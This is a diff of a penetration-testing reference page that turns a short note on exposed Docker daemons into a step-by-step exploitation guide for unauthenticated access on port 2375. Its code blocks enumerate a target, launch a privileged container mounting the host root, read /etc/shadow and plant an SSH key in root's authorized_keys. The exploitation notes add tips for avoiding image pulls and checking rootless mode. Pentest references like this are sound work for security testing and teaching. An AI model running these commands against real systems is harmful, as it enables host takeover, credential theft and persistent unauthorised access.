@@ -1,34 +1,49 @@
 ---
-title: "Unauthenticated daemon access: the plaintext Docker API on 2375"
-description: "Reaching a Docker daemon exposed on the plaintext TCP port 2375, which requires no authentication, giving full control of the engine to list and run containers and take over the host."
+title: "Unauthenticated daemon access: full control over an open port 2375"
+description: "Docker's daemon on TCP 2375 serves its API in plain HTTP with no authentication. Any client that can reach the port issues API calls as if it were local root: listing and exec-ing into containers, reading environment secrets, and launching a new privileged container that mounts the host root, giving complete host compromise."
 keywords:
   - docker 2375
   - unauthenticated docker
-  - docker remote API
-  - exposed daemon
-  - container takeover
+  - docker api
+  - remote code execution
+  - host takeover
 ---
 
 # Unauthenticated daemon access
 
-When the daemon is bound to `tcp://0.0.0.0:2375`, the API is served in plaintext with no authentication. Anyone who can reach the port controls the engine. It is a common misconfiguration on cloud hosts and CI runners.
+Port 2375 is the Docker daemon's plain-HTTP API endpoint. It carries no authentication and no transport security, so every request is honoured as a local, root-privileged operation. An exposed 2375 is therefore not an information leak but an immediate full compromise: the caller has the same power as the host's root user through the daemon.
+
+Confirm access and point the Docker CLI at it:
 
 ```bash
-# Find and confirm an open daemon
-curl -s http://<host>:2375/version
-docker -H tcp://<host>:2375 ps
-
-# From here it is a full host takeover
-docker -H tcp://<host>:2375 run -v /:/host --privileged -it alpine chroot /host sh
+curl -s http://<target>:2375/version                 # version/info => reachable and open
+export DOCKER_HOST=tcp://<target>:2375
+docker info                                           # the CLI now drives the remote daemon
+docker ps -a; docker images                           # enumerate the environment
 ```
+
+## From access to host root
+
+The daemon can create a container that mounts the host root and runs privileged; one command owns the host:
+
+```bash
+docker -H tcp://<target>:2375 run -v /:/host --privileged --rm -it alpine \
+  chroot /host sh
+# or non-interactively, read a host secret and plant a key
+docker -H tcp://<target>:2375 run -v /:/host --rm alpine \
+  sh -c 'cat /host/etc/shadow; echo "ssh-ed25519 AAAA... a" >> /host/root/.ssh/authorized_keys'
+```
+
+Without the CLI, the same is done over the raw API with `curl`, creating a container with `HostConfig.Binds` of `/:/host` and `Privileged:true`, as on [Runtime socket mount](../../../container-escape/sensitive-mounts/runtime-socket-mount.md). Enumeration of what is already present often yields secrets faster than a fresh container; see [API enumeration](api-enumeration.md).
 
 ## Exploitation notes
 
-- Shodan and simple scans find these at scale; `/version` and `/info` confirm an unauthenticated daemon.
-- The takeover step is the same as any daemon access, covered in [Host takeover via privileged run](host-takeover-via-privileged-run.md).
-- A daemon reached through a mounted socket rather than the network is the container-escape case [Runtime socket mount](../../../container-escape/sensitive-mounts/runtime-socket-mount.md).
+- No credentials are involved; reachability is the only gate, so the find-and-own step is a single `docker -H` command once the port responds.
+- Reuse an image already present on the host (`docker images`) to avoid a pull; any Linux image works since you immediately `chroot` the host root.
+- The container runs as real host root unless the daemon is in rootless mode; `docker info` shows `rootless` under security options if so, which constrains what the mount yields.
 
 ## References
 
 - [Docker: protect the daemon socket](https://docs.docker.com/engine/security/protect-access/)
-- [Docker Engine API](https://docs.docker.com/engine/api/)
+- [HackTricks: 2375 Docker](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
+- [Docker Engine API: containers](https://docs.docker.com/reference/api/engine/)
